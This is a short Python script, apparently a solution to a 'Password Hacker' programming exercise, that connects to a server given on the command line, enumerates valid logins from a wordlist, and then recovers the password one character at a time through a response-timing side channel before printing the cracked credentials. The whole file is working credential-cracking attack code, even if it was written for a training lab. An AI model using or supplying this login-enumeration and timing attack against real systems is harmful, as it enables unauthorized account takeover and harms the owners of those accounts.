import json
import sys
import socket
from datetime import datetime

args = sys.argv
hostname = args[1]
port = int(args[2])
logins = open('C:\\Users\\root\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt', "r")
chars = [chr(i) for i in range(48, 58)] + [chr(i) for i in range(61, 123)]


with socket.socket() as client_socket:
    address = (hostname, port)
    client_socket.connect(address)
    login = ""
    password = ""
    for test in logins.readlines():
        request = json.dumps({"login": test.strip(), "password": ""})
        client_socket.send(request.encode())
        response = json.loads(client_socket.recv(1024).decode())
        if response["result"] == "Wrong password!":
            login = test.strip()
            break
    while True:
        for i in chars:
            request = json.dumps({"login": login, "password": password + i})
            client_socket.send(request.encode())
            start = datetime.now()
            response = json.loads(client_socket.recv(1024).decode())
            finish = datetime.now()
            difference = finish - start
            if response["result"] == "Wrong password!" and difference.microseconds >= 1200:
                password += i
                break
            if response["result"] == "Connection success!":
                password += i
                admin = json.dumps({"login": login, "password": password}, indent=4)
                print(admin)
                logins.close()
                sys.exit()
